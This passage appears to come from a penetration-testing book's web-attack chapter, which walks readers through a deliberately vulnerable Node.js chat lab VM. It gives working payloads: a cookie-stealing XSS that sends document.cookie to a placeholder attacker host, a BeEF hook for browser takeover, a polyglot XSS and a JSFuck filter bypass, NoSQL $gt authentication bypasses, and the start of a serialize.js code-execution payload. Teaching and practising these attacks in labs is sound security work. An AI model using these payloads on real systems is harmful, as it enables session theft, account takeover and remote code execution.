exploit the vulnerability , screenshots, and even a work ing proof of concept. if you need help creating consistent reports, take a look at this report generation form: https://buer .haus/breport/index.php. having run my own programs before, one thing to note about exploiting vulnerabilities for bug bounty programs is that i have seen a few cases where researchers got carried away and went past validating the vulnerability . some examples include dumping a whole database after finding an sql injection, defacing a page with something they thought was funny after a subdomain takeover , and even laterally movin g within a production environment after an initial remote code execution vulnerability . these cases could lead to legal trouble and to potentially having the feds at your door. so use your best judgement, check the scope of the program, and remember that if it feels illegal, it probably is. web attacks introduction - cyber space kittens after finishing reconnaissance and discovery , you review all the different sites you found. looking throu gh your results, you don’t see the standard exploitable servers/misconfigur ed applications. there aren’ t any apache tomcat servers or heartbleed/sh ellshock, and it looks like they patched all the apache strut issues and their cms applications. your sixth sense intuition kicks into full gear and you start poking around at their customer support system application. something just doesn’ t feel right, but where to start? for all the attacks in the web application exploitation chapter , a custom thp3 vmware virtual machin e is available to repeat all these labs. this virtual machine is freely available here: http://thehackerplaybook.com/get.php?type=csk-web to set up the demo for the w eb environment (customer system support): download the custom thp vm from: http://thehackerplaybook.com/get.php?type=csk-web download the full list of commands for the labs: https://github.com/cheetz/thpchatsupportsystem/blog/master/lab.txt bit.ly link: http://bit.ly/2qbdrfo boot up and log into the vm when the vm is fully booted, it should show you the current ip address of the application. you do not need to log into the vm nor is the password pr ovided. it is up to you to break into the application. since this is a web application hosted on your own system, let's make a hostname record on our attacker kali system: on our attacker kali vm, let's edit our host file to point to our vulnerable application to reference the application by hostname versus by ip: gedit /etc/hosts add the following line with the ip of your vulnerable application: [ip address of v uln app] chat now , go to your browser in kali and go to http://chat:3000/. if everything worked, you should be able to see the nodejs custom v uln application. the commands and attacks for the web section can be extremely long and complicated. to make it easy, i’ve included all the commands you’ll need for each lab here: https://github.com/cheetz/thp-chatsupportsystem/blog/master/lab.txt the red t eam w eb application attacks the first two books focused on how to efficiently and effectively test web applications – this time will be a little dif ferent. w e are going to skip many of the basic attacks and move into attacks that are used in the real world. since this is more of a practical book, we won’ t go into all of the detailed technicalities of web application testing. however , this doesn’ t mean that these details should be ignored. a great resource for web application testing information is open web application security project, or owasp. owasp focuses on developing and educating users on application security . every few years , owasp compiles a list of the most common issues and publishes them to the public - http://bit.ly/2hahogr. a more in-depth testing guideline is located here: http://bit.ly/2gzbvzd. this document will walk you through the types of vulnerabilities to look for, the risks, and how to exploit them. this is a great checklist document: http://bit.ly/2qya9m1. as many of my readers are trying to break into the security field, i wanted to quick ly menti on one thing: if you are going for a penetration testing job, it is imperative to know , at a minimum, the owasp top 10 backwards and forwards. you should not only know what they are, but also have good examples for each one in terms of the types of risks they bring and how to check for them. now , let's get back to compromising csk. chat support systems lab the chat support system lab that will be attacked was built to be interactive and highlight both new and old vulnerabilities. as you will see, for many of the following labs, we provide a custom vm with a version of the chat support system. the application itself was written in node.js. why node? it is one of the fastest growing applications that we see as penetration testers. since a lot of developers seem to really like node, i felt it was important for you to understand the security implications of running javascript as backend code. what is node? “node.js® is a javascript runtime built on chrome's v8 javascript engine. node.js uses an event-driven, non-blocking i/o model that makes it lightweight and efficient.” [https://nodejs.or g/en/] node.js' package ecosystem, npm , is the largest ecosystem of open source libraries in the world. at a very basic level, node.js allows you to run javascript outside of a browser . due to the fact that node.js is lean, fast, and cross-plat form, it can greatly simplify a project by unifying the stack. although node.js is not a web server , it allows a server (something you can program in javascript) to exist in an environment outside of the actual w eb client. benefits: very fast single-threaded javascript environment which is capable of acting as a standalone web application server node.js is not a protocol; it is a web server written in javascript the npm registry hosts almost half a million packages of free, reusable node.js code, which makes it the lar gest software registry in the world with node.js becoming so popular in the past couple years , it is very important for penetration tester s/red teamers to understand what to look for and how to attack these applications. for example, a researcher identified that weak npm credentials gave him edit/publish access to 13% of npm package s. through dependency chains, an estimated 52% of npm packages could have been vulnerable. [https://www .bleepingcomputer .com/news/security/52-percent-of-alljavascript-npm-packages-could-have-been-hacked-via-weak-credentials/] in the following examples, our labs will be using node.js as the foundation of our applications, which will utilize the express framework (https://expressjs.com/) for our web server . we will then add the pug (https://pugjs.or g/) template engine to our express framework. this is similar to what we are now commonly seeing in newe r-developed applications. express is a minimalistic web framework for node.js. express provides a robust set of features for web and mobile applications so you don't have to do a lot of work . with modules called middlewares, you can add third party authentication or services like facebook auth or stripe payment processing. pug, formally known as jade, is a server -side templating engine that you can (but do not have to) use with express. jade is for programmatically generating the html on the server and sending it to the client. let's attack csk and boot up the chat support system v irtual machine. cyber space kittens: chat support systems you stumble across the external ly-facing cyber space kittens chat support system. as you slowly sift through all the pages and understand the underlying syste m, you look for weaknesses in the application. you need to find your first entry point into the server so that you can pivot into the production environment. you first run through all of your vulnerability scanner and web application scanner reports, but come up empty-handed. it looks like this company regularly runs the common vuln scanners and has patched most of its issues. the golden egg findings now rely on coding issues, misconfigurations, and logic flaws. you also notice that this application is running nodejs, a recently popular language. setting up y our w eb application hacking machine although there are no perfect recipes for red teaming web applications, some of the basic tools you will need include: arming yourself with browsers. many browsers act very differently especially with complex xss evasion: firefox (my favorite for testing) chrome safari wappalyzer: a cross-platform utility that uncovers the technologies used on websites. it detects content management systems, ecommerce platforms, web frameworks, server software, analytics tools and many more. https://wappalyzer .com/ builtw ith: a web site profiler tool. upon looking up a page, builtw ith returns all the technologies it can find on the page. builtw ith’s goal is to help developers, researchers and designers find out what technologies pages are using, which may help them to decide what technologies to implement themselves. https://builtwith.com/ retire.js: scan a web app for use of vulnerable javascript libraries. the goal of retire.js is to help you detect use of a version with known vulnerabilities. https://chrome.google.com/webstore/detail/retirejs/mo ibopkbhjceeedibkbkbchbjnkadmom?hl=en burp suite (~$350): although this commercial tool is a bit expensive, it is definitely worth every penny and a staple for penetration testers/red t eamers. its benefits come from the add-ons, modular design, and user development base. if you can't af ford burp, ow asp zap (which is free) is an excellent replacement. analyzing a w eb application before we do any type of scann ing, it is important to try to understand the underlying code and infrastructure. how can we tell what is running the backend? we can use wappa lyzer , builtw ith, or just google chrome inspect. in the images below , when loading up the chat applica tion, we can see that the http headers have an x-powered by: express. we can also see with w appalyzer that the application is using express and node.js. understanding the application before blindly attacking a site can help provide you with a much better approach. this could also help with targeted sites that might have wafs, allowing you to do a more ninja attack. web discovery in the previous books, we went into more detail on how to use burp suite and how to penetration test a site. we are going to skip over a lot of the setup basics and focus more on attacking the site. we are going to assume, at this point, that you have burp suite all set up (free or paid) and you are on the thp kali image. once we have an understanding of the underlying system, we need to identify all the endpoints. we still need to run the same discovery tools as we did in the past. burp suite (https://portswigger .net/burp) spidering: in both the free and paid versions, burp suite has a great spidering tool. content discovery: if you are using the paid version of burp suite, one of the favorite discovery tools is under engagement tools, discover content. this is a smart and ef ficient discovery tool that looks for directories and files. y ou can specify several dif ferent configurations for the scan. active scan: runs automated vulnerability scanning on all parameters and tests for multiple web vulnerabilities. owasp zap (http://bit.ly/2ivnao2) similar to burp, but completely open source and free. has similar discover and active scan features. dirbuster an old tool that has been around forever to discover files/folders of a web application, but still gets the job done. target url: http://chat:3000 word list: /usr/share/wordlists/dirbuster/directory-list2.3-small.txt gobuster (https://github.com/oj/gobuster) very lightweight, fast directory and subdomain bruteforce tool gobuster -u http://chat:3000 -w /opt/seclists/discovery/w eb-content/raft-smalldirectories.txt -s 200,301,307 -t 20 your wordlists are very important. one of my favorite wordlists to use is an old one called raft, which is a collection of many open source projects. you can find these and other valuable wordlists here: https://github.com/danielmiessler/seclists/tree/master/discovery/w ebcontent (which is already included in your thp kali image). now that we are done with the overview , let’s get into some attacks. from a red team perspective, we are looking for vulnerabilities we can actively attack and that provide the most bang for our buck. if we were doing an audit or a penetration test, we might report vulnerabilities like ssl issues, default apache pages, or non-exploitable vulnerabilities from vulnerability scanner . but, on our red team engagements, we can completely ignore those and focus on attacks that get us advanced access, shells, or dump pii. cross-site scripting xss at this point, we have all seen and dealt with cross-site scripting (xss). testing every variable on a website with the traditional xss attack: <script>alert(1)</script>, might be great for bug bounties, but can we do more? what tools and methods can we use to better utilize these attacks? so, we all know that xss attacks are client-side attacks that allow an attacker to craft a specific web request to inject malicious code into a response. this could generally be fixed with proper input validation on the client and server -side, but it is never that easy. why , you ask? it is due to a multitude of reasons. everythi ng from poor coding, to not understanding frameworks, and sometimes applications just get too complex and it becomes hard to understand where an input goes. because the alert boxes don't really do any real harm, let's start with some of the basic types of xss attacks: cookie stealing xss: <script>document.write('<img src=\"http://<y our ip>/stealer .php?cookie=' %2b document.cookie %2b '\" />');</script> forcing the download of a file: <script>var link = document.createelement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty .exe'; link.download = ''; document.body .appendchild(link); link.click();</script> redirecting user: <script>window .location = \"https://www .youtube.com/watch?v=dqw4w9wgxcq\"; </script> other scripts to enable key loggers, t ake pictures, and more http://www .xss-payloads.com/payloads-list.html? c#category=capture obfuscated/polyglot xss payloads in today's world, the standard xss payload still works pretty often, but we do come across applications that block certain characters or have wafs in front of the application. two good resources to help you start crafting obfuscated xss payload attacks: https://github.com/foospidy/payloads/tree/master/other/xss https://www .owasp.or g/index.php/xss_filter_evasion_cheat_s heet sometimes during an assessment, you might run into simple xss filters that look for strings like <script>. obfuscating the xss payload is one option, but it is also important to note that not all javascript payloads require the open and close <script> tags. there are some html event attributes that execute javascript when triggered (https://www .w3schools.com/tags/ref_eventattributes.asp). this means any rule that looks specifically for script tags will be useless. for example, these html event attributes that execute javascript being outside a <script> tag: <b onmouseover=alert('xss')>click me!</b> <svg onload=alert(1)> <body onload=\"alert('xss')\"> <img src=\"http://test.cyberspacekittens.com\" onerror=alert(document.cookie);> you can try each of these html entity attacks on the csk application by going to the application: http://chat:3000/ (remember to modify your /etc/host file to point chat to your vm ip). once you are there, register an account, log into the applica tion, and go to the chat functionality (http://chat:3000/chatchannel/1). try the different entity attacks and obfuscated payloads. other great resources for xss: the first is mind map made by @jackmasa. this is a great document that breaks down different xss payloads based on where your input is served. although no longer on jackmasa github page, a copy exists here: http://bit.ly/2qvnleq. another great resource that discusses which browsers are vulnerable to which xss payloads is: https://html5sec.or g/. *jackmasa xss mind map as you can see, it is sometime s annoying to try to find every xss on an application. this is because vulnerable parameters are affected by code features, different types of html tags, types of applications, and different types of filtering. trying to find that initial xss pop-up can take a long time. what if we could try and chain multiple payloads into a single request? this last type of payload is called a polyglot. a polyglot payload takes many different types of payload/obfuscation techniques and compiles them into one attack. this is great for automated scripts to look for xss, bug bounty hunters with limited time, or just a quick way to find input validation issues. so, inste ad of the normal <scrip t>alert(1)</script>, we can build a polyglot like this (http://bit.ly/2gxxqxh): /*-/*`/*\\`/*'/*\"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/-!>\\x3csvg/<svg/onload=alert()//>\\x3e if you look at the payload above, the attack tries to break out of comments, ticks and slashes; perform an onclick xss; close multiple tags; and lastly tries an onload xss. these types of attacks make polyglots extremely effective and efficient at identif ying xss. you can read more about these polyglot xsss here: https://github.com/0xsobky/hackv ault/wiki/unleashing-an-ultimate-xsspolyglot if you want to test and play around with the different polyglots, you can start here on the vulnerable xss pages (http://chat:3000/xss) or throughout the chat application. beef browser exploi tation framewo rk (http://beefproject.com/) or beef , takes xss to another level. this tool injects a javascript payload onto the victim’ s browse r, which infects the user’s system. this creates a c2 channel on the victim’ s browser for javascript post-exploitation. from a red team perspective, beef is a great tool to use on campaigns, track users, capture credent ials, perform clickjacking, attack with tabnapping and more. if not used during an attack, beef is a great tool to demonstrate the power of an xss vulnerability . this could assist in more complicated attacks as well, which we will discuss later in the book under blind xss. beef is broken down into two parts: one is the server and the other is the attack payload. t o start the server: start beef on y our attacker kali host from a t erminal beef-xss authenticate with beef:beef view http://127.0.0.1:3000/hook.js full payload hook file: <script src=\"http://<y our ip>:3000/hook.js\"> </script> viewing your hook.js file located on http://127.0.0.1:3000/hook.js, you should see something that resembles a long-obfuscated javascript file. this is the client payload to connect your victim back to the command and control server . once you have identified an xss on your target application, instead of the original alert(1) style payload, you would modify the <script src=\"http://<y our ip>:3000/hook.js\"></script> payload to exploit the vulnerability . once your victim falls for this xss trap, it will cause their browser to connect back to you and be a part of your zombie network. what types of post exploitation attacks does beef support? once your victim is under your control, you really can do anything that javascript can do. you can turn on their camera via htlm5 and take a picture of your victim, you can push overlays on their screen to capture credentials, or you can redirect them to a malicious site to execute malware. here is a quick demonstration of beef's ability to cause massive issues from an xss attack: first, make sure your beef server is running on your attacker machine. on our vulnerable chat support system's application, you can go to http://chat:3000/xss and inside the exercise 2 field and put in your payload: <script src=\"http://127.0.0.1:3000/hook.js\"></script> once your victim is connected to your zombie network, you have full control of their browser . you can do all sorts of attacks based on their device, browser , and enabled features. a great way to demonstrate xss impact with social engineering tactics is by pushing malware to their machine via a flash update prompt. once executed, a pop-up will be presented on the victim's machine, forcing them to install an update, which will contain additional malware. i recom mend spending some time playing around with all the beef post exploitation modules and unders tanding the power of javascript. since we control the browser , we have to figure out how to use this in terms of red team campaigns. what else might you want to do once you have infected a victim from an xss? we will discuss this in the xss to compromise section. blind xss blind xss is rarely discussed as it is a patient person's game. what is blind xss? as the name of the attack suggests, it is when an execution of a stored xss payload is not visible to the attacker/user , but only visible to an administrator or back-end employee. although this attack could be very detrimental due to its ability to attack backend users, it is often missed. for exam ple, let's assume an application has a \"contact us\" page that allows a user to supply contact information to the administrator in order to be contacted later. since the results of that data are only view able by an administrator manually and not the requesting user and if the application was vulnerable to xss, then the attacker would not immediate ly see their \"alert(1)\" attack. in these cases, we can use xsshunter (https://xsshunter .com) to help us validate the blind xss. how xsshunter works is that when our javascript payload executes, it will take a screenshot of the victim's screen (the current page they are viewing) and send that data back to the xsshunter's site. when this happens, xsshunter will send an alert that our payload executed and provide us with all the detailed information. we can now go back to create a very malicious payload and replay our attack. xss hunter: disable any proxies (i.e. burp suite) create account at https://xsshunter .com login at https://xsshunter .com/app go to payloads to get your payload modify the payload to fit your attack or build a polyglot with it check xss hunter to see the payload execution dom based xss the understand ing of reflective and stored xss is relatively straight forward. as we already know , the server doesn’ t provide adequate input/output validation to the user/database and our malicious script code is presented back to user in source code. however , in dom based xss, it is slightly differen t, which many cause some common misund erstandings. therefore, let’ s take some time to focus on dom based xss. document object model (dom) based xss is made possible when an attacker can manipulate the web application’ s client-side scripts. if an attacker can inject malicious code into the dom and have it read by the client’ s browser , the payload can be executed when the data is read back from the dom. what exactly is the dom? the document object model (dom) is a representation of html properties. since your browser doesn’ t understand html, it uses an interpreter that transforms html into a model called the dom. let's walk through this on the chat support site. looking at the vulnerable web application, you should be able to see that the chat site is vulnerable to xss: create an account login go to chat try <script>ale rt(1)</script> and then try some crazy xss attacks! in our example, we have node.js on the server side, socket.io (a library for node.js) setting up web sockets between the user and server , client-side javascript, and our malicious msg.msgt ext javascript. as you can see below and in source code for the page, you will not see your \"alert\" payload directly referenced as you would in a standard reflective/stored xss. in this case, the only reference we would receive that indicates where our payload might be called, is from the msg.name reference. this does sometimes make it hard to figur e out where our xss payload is executed or if there is a need to break out of any html tags. advanced xss in nodejs one of the big reasons why xss keeps coming back is that it is much harder than just filtering for tags or certain characters. xss gets really difficult to defend when the payloads are specific to a certain language or framework. since every language has its oddities when it comes to vulnerabilities, it will be no dif ferent with nodejs. in the advanced xss section , you are going to walk through a few examples where language-specific xss vulnerabilities come into play. our nodejs web application will be using one of the more common web stacks and configurations. this implementation includes the express framework (https://expressjs.com/) with the pug template engine (https://pugjs.or g/). it is important to note that by default, express really has no built-in xss prevention unles s rendering through the template engine. when a template engine like pub is used, there are two common ways of finding xss vulnerabilities: (1) through string interpolation, and (2) buf fered code. template engines have a concept of string interpolation, which is a fancy way of saying “placeholders for string variables.” for example , let's assign a string to a variable in the pug template format: - var title = \"this is the html t itle\" - var thp = \"hack the planet\" h1 #{title} p the hacker playbook will teach you how to #{thp} notice that the #{thp} is a placeholder for the variable that was assigned prior to thp. we commonly see these templates being used in email distribution messages. have you ever received an email from an automated system that had dear ${first_name}... instead of your actual first name? this is exactly what templating engines are used for . when the template code above is rendered into html, it will look like: <h1>this is the html t itle</h1> <p>the hacker playbook will teach you how to hack the planet</p> luckily , in this case, we are using the \"#{}\" string interpolation, which is the escaped version of pug interpolation. as you can see, by using a template, we can create very reusable code and make the templates very lightweight. pug supports both escaped and unescaped string interpolation. what's the difference betw een escaped and unescaped? well, using escaped string interpolation will html-encode characters like <,>,', and \". this will assist in providing input validation back to the user. if a developer uses an unescaped string interpolation, this will generally lead to xss vulnerabilities. furthermore, string interpolation (or variable interpolation, variable substitution, or variable expans ion) is the process of evaluat ing a string literal containin g one or more placeholders, yielding a result in which the placeholders are replaced with their corresponding values. [https://en.wikipedia.or g/wiki/string_interpolation] in pug escaped and unescaped string interpolation (https://pugjs.or g/language/interpolation.html): !{} – unescaped string interpolation #{} – escaped string interpolation *although this is escaped, it could still be vulnerable to xss if directly passed through javascript in javascript, unescaped buf fer code starts with \"!=\". anything after the \"!=\" will automatically execute as javascript. [https://pugjs.or g/language/code.html#unescaped-buf fered-code] lastly , anytime raw html is allowed to be inserted, there is the potential for xss. in the real world, we have seen many cases that were vulnerable to xss, based on the above notation where the developer forgets which context they are in and from where the input is being passed. let’s take a look at a few of these example s on our vulner able chat support system application. go to the following url on the vm: http://chat:3000/xss. we will walk through each one of these exercises to understand nodejs/pug xss. exer cise 1 (http://chat:3000/xss) in this example, we have escaped string interpolation into a paragraph tag. this is not exploitable because we are using the correct escaped string interpolation notation within the html paragraph context. go to http://chat:3000/xss and click exercise #1 the pug t emplate source code: p no results found for #{name1} try entering and submitting the following payload: <script>alert(1)</script> click back on exercise #1 and review the no results output view the html response (view the source code of the page): &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e; after hitting submit, look at the page source code (ctrl+u) and search for the word \"alert\". you are going to see that the special characters from our payload are converted into html entities. the script tags are still visible on our site through our browser , but are not rendered into javascript. this use of string interpolation is correct and there is really no way to break out of this scenario to find an xss. a+ work here! let's look at some poor implementations. exer cise 2 in this example, we have unescaped string interpolation denoted by the !{} in a paragraph tag. this is vulnerable to xss by design. any basic xss payload will trigger this, such as: <script>alert(1)</script> go to exercise #2 the pug t emplate source code: p no results found for !{name2} try entering the payload: <script>alert(1)</script> response: <script>alert(1)</script> after hitting submit, we should see our pop-up. you can verify by looking at the page source code and searching for \"alert\". so, using unescaped string interpolation (!{name2}) where user input is submitted, leads to a lot of trouble. this is a poor practice and should never be used for user-submitted data. any javascript we enter will be executed on the victim's browser . exer cise 3 in this example, we have escaped string interpolation in dynamic inline javascript. this means we are protected since it's escaped, right? not necessarily . this example is vulnerable because of the code context we are in. we are going to see that in the pug template, prior to our escaped interpolation, we are actually inside a script tag. so, any javascript, although escape d, will automatically execute. even better , because we are in a script tag, we do not need to use the <script> tag as part of our payload. w e can use straight javascript, such as: alert(1): go to example #3 pug t emplate source code: script. var user3 = #{name3}; p no results found for #{name3} this template will translate in html like the following: <script> <p>no results found for [escaped user input]</p> </script> try entering the payload: 1;alert(1); after hitting submit, we should see our pop-up. y ou can verify by looking at the page source code and searching for \"alert\". although, a small change, the proper way to write this would have been to add quotes around the interpolation: pug t emplate source code: script. var user3=\"#{name3}\" exer cise 4 in this example, we have pug unescaped buffered code (https://pugjs.or g/language/code.html) denoted by the != which is vulnerable to xss by design, since there is no escaping. so in this scenario, we can use the simple \"<script >alert(1)</script>\" style attack against the input field. pug t emplate source code: p != 'no results found for '+name4 try entering the payload: <script>alert(1)</script> after hitting submit, we should see our pop-up. you can verify by looking at the page source code and searching for \"alert\". exer cise 5 let's say we get to an appli cation that is using both escaped string interpolation and some type of filtering. in our following exercise, we have minimal blacklist filtering script being performed within the nodejs server dropping characters like \"<\", \">\" and \"alert\". but, again they made the mistake of putting our escaped string interpolation within a script tag. if we can get javascript in there, we could have an xss: go to example #5 pug t emplate source code: name5 = req.query .name5.replace(/[;'\"<>=]|alert/g,\"\") script. var user3 = #{name5}; try entering the payload: you can try the alert(1), but that doesn't work due to the filter . you could also try things like <script>alert(1)</script>, but escaped code and the filter will catch us. what could we do if we really wanted to get our alert(1) payload? we need to figure out how to bypass the filter to insert raw javascript. remember that javascript is extremely powerful and has lots of functionality . we can abuse this functionality to come up with some creative payloads. one way to bypass these filters is by utilizing esoteric javascript notation. this can be created through a site called: http://www .jsfuck.com/. as you can see below , by using brackets, parentheses, plus symbols, and exclamation marks, we can recreate alert(1). jsf*ck payload: [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+ []+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!! []+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+ []]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+ []+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!! []+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[]) [!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+ (!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+ [])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([] [[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+ []]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+ []+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!! []+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+ [+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+ []+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[]) [+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[]) [!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+ [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+ []+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!! []+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+ [])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+ []]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]])[!+[]+!+[]+[+[]]])() as you know , many browsers have started to include xss protections. we have even used these payloads to bypass certain browser prote ctions. try using them in your actual browser outside of kali, such as chrome. xss is not an easy thing to prote ct from on complex applications. it is easy to either miss or misunderstan d how a framework processes input and output. so when performing a source code review for pug/nodejs applications, searching for !{ , #{, or `${ in source code is helpful for identifying locations for xss. being aware of the context, and whether or not escaping is required in that context, is vital as we will see in the following examples. although these attacks were specific to node and pug, every language has its problems against xss and input validation. you won't be able to just run a vulnerability scanner or xss fuzzing tool and find all the xss vulnerabilities. you really need to understand the language and frameworks used. xss to compr omise one question i get often is, how can i go from an xss to a shell? although there are many different ways to do this, we usually find that if we can get a user-to-admin style xss in a content management system (cms) or similar , then this can lead to complete compromise of the system. an entire walkthrough example and code can be found here by hans-michael varbaek: https://github.com/v arbaek/xsser . hans-michael presented some great examples and videos on recreating an xss to rce attack. a custom red team attack that i like to utilize involves taking advantage of the features of javascript. we know that javascript is extreme ly powerful and we have seen such features in beef (browser exploitation framework). therefore, we can take all that functionality to perform an attack unbeknow nst to the victim. what would this payload do? one example of an attack is to have the javascript xss payload that runs on a victim machine grab the internal (natted) ip address of the victim. we can then take their ip address and start scanning their internal network with our payload. if we find a known web application that allows compromise without authentication, we can send a malicious payload to that server . for example our target could be a jenkins server , which we know if unauthenticated, pretty much allows complete remote code execution. to see a full walkthrough of an xss to jenkins compromise, see chapter 5 exploiting internal jenkins with social engineering. nosql injections in thp 1 & 2, we spent a fair amount of time learning how to do sql injections and using sqlmap (http://sqlmap.or g/). other than some obfuscation and integration into burp suite, not much has changed from thp2. instead, i want to delve deeper into nosql injections as these databases are becoming more and more prevalent. traditional sql databases like mysql, mssql, and oracle rely on structured data in relational databases. these databases are relational, meaning data in one table has relation to data in other tables. that makes it easy to perform queries such as \"give me all clients who bough t something in the last 30 days”. the caveat with this data is that the format of the data must be kept consistent across the entire database. nosql databases consist of the data that does not typically follow the tabular/relational model as seen in sql-queried databases. this data, called \"unstructured data\" (like pictures, videos, social media), doesn't really work with our massive collection data. nosql features: types of nosql databases: couch/mongodb unstructured data grows horizontally in traditional sql injections, an attacker would try to break out of an sql query and modify the query on the server -side. with nosql injections, the attacks may execute in other areas of an application than in traditional sql injections. additionally , in traditional sql injections, an attacker would use a tick mark to break out. in nosql injections, vulnerabilities generally exist where a string is parsed or evaluated into a nosql call. vulnerabilities in nosql injections typically occur when: (1) the endpoint accepts json data in the reques t to nosql databases, and (2) we are able to manipulate the query using nosql comparison operators to change the nosql query . a comm on example of a nosq l injection would be injecting something like: [{\"$gt\":\"\"}]. this json object is basically saying that the operator ($gt) is greater than null (\"\"). since logically everything is greater than null, the json object becomes a true statement, allowing us to bypass or inject into nosql queries. this would be equivalent to [' or 1=1--] in the sql injection world. in mongodb, we can use one of the following conditional operators: (>) greater than - $gt (<) less than - $lt (>=) greater than equal to - $gte (<= ) less than equal to - $lte attack the customer support system nosql application first, walk through the nosql workflow on the chat application: in a browser , proxying through burp suite, access the chat application: http://chat:3000/nosql try to authentic ate with any username and password. look at post traffic that was sent during that authentication request in burp suite . in our chat application, we are going to see that during authentication to the /loginnosql endpoint, our post data will contain {“username”:”admin”,”password”,”guessingadminpassword”}. it is pretty common to see json being used in post requests to authenticate a user, but if we define our own json objects, we might be able to use different condit ional statement s to make true statements. this would effectively equal the traditional sqli 1=1 statement and bypass authentication. let's see if we can inject this into our application. server sour ce code in the nosql portion of the chat application, we are going to see the json post request as we did befor e. even though, as a black box test, we wouldn't see the server -side source code, we can expect it to query the mongodb backend in some sort of fashion similar to this: db.collection(collection).find({\"username\":username, \"password\":password}).limit(1)... injecting into nosql chat as we can see from the server -side source code, we are taking the usersupplied usernam e/password to search the database for a match . if we can modify the post request, we might be able to inject into the database query . in a browser , proxying through burp suite, access the chat application: http://chat:3000/nosql turn \"intercept\" on in burp suite, click login, and submit a username as admin and a password of guessingadminpassword proxy the traf fic and intercept the post request {\"username\":\"admin\",\"password\",\"guessingadminpassword\"} to {\"username\":\"admin\",\"password\":{\"$gt\":\"\"}} you should now be logged in as admin! so what happened here? w e changed the string \"guessingadminpassword\" to a json object {\"$gt\":\"\"}, which is the true statement as everything greater than null is true. this changed the post request to {\"username\":\"admin\",\"password\":true}, which automatically makes the request true and logs in as admin without any knowledge of the password, replicating the 1=1 attack in sqli. advanced nosqli nosql injectio ns aren't new, but the purpose of the nodejs chapter is to show how newer frameworks and languages can potentially introduce new vulnerabilities. for example, node.js has a qs module that has specific syntax to convert http request parameters into json objects. the qs module is used by default in express as part of the 'body-parser' middleware. qs module: a querystring parsing and stringifying library with some added security . [https://www .npmjs.com/package/qs] what does this mean? if the qs module is utilized, post requests will be converted on the server side as json if using bracket notation in the parameters. therefore, a post request that looks like username[value]=admin&password[value]=admin will be converted into {\"username\": {\"value\":\"admin\"}, \"password\":{\"value\":\"admin\"}}. now , the qs module will also accept and convert post parameters to assist in nosqli: for example, we can have a post request like the following: username=admin&password[$gt]= and the server -side request conversion would translate to: {\"username\":\"admin\", \"password\":{\"$gt\":\"\"} this now looks similar to the original nosqli attack. now , our request looks identical to the nosqli we had in the previous section. let's see this in action: go to http://chat:3000/nosql2 turn burp intercept on log in with admin:anything modify the post parameter: username=admin&password[$gt]=&submit=login you should be logged in with admin! you have executed the nosql injection using the qs module parser utilized by the express framework as part of the body-parser middlew are. but wait, there's more! what if you didn't know which usernames to attack? could we use this same attack to find and log in as other accounts? what if instead of the password comparison, we tried it on the username as well? in this case, the nosqli post request would look something like: username[$gt]=admin&password[$gt]=&submit=login the above post request essentially queries the database for the next username greate r than admin with the password field resulting in a true statement. if successful, you should be logged in as the next user, in alphabetical order, after admin. continue doing this until you find the superaccount. more nosql payloads: https://github.com/swisskyrepo/payloadsallthethings/tree/mast er/nosql%20injection https://blog.websecurify .com/2014/08/hacking-nodejs-andmongodb.htmlhttps://www .owasp.or g/index.php/t esting_for_no sql_injection deserialization attacks over the past few years, serialization/deserialization attacks via web have become more and more popula r. we have seen many different talks at blackhat, disco vered critical vulnerabilities in common appli cations like jenkins and apache struts2, and are seeing a lot of active research being developed like ysoserial (https://github.com/frohof f/ysoserial). so what's the big deal with deserialization attacks? before we get started, we need to understand why we serialize. there are many reasons to serialize data, but it is most commonly used to generate a storable represen tation of a value/data without losing its type or structure. serialization converts objects into a stream of bytes to transfer over network or for storage. usually conversion method involves xml, json, or a serialization method specific to the language. deserialization in nodejs many times, finding complex vulnerabilities requires in-depth knowledge of an application. in our scenar io, the chat nodejs application is utilizing a vulner able version of serialize.js (https://github.com/luin/seria lize). this node library was found to be vulnerable to exploitation due to the fact that \"untrusted data passed into the unserialize() function can be exploited to achieve arbitrary code execution by passing a javascript object with an immediately invoked function expression (iife).” [https://cve.mitre.or g/cgi-bin/cvename.cgi?name=cve-2017-5941] let's walk through the details of an attack to better understand what is happening. first, we review the serialize.js file and do a quick search for eval (https://github.com/luin/serialize/search? utf8=%e2%9c%93&q=eval&type=). generally , allowing user input to go into a javascript eval statement is bad news, as eval() executes raw javascript. if an attacker is able to inject javascript into this statement, they would be able to have remote code execution onto the server . second, we need to create a serialized payload that will be deserialized and run through eval with our javascript payload of require('child_process').exec('ls'). {\"thp\":\"_$$nd_func$$_function () {require('child_process').exec('do system 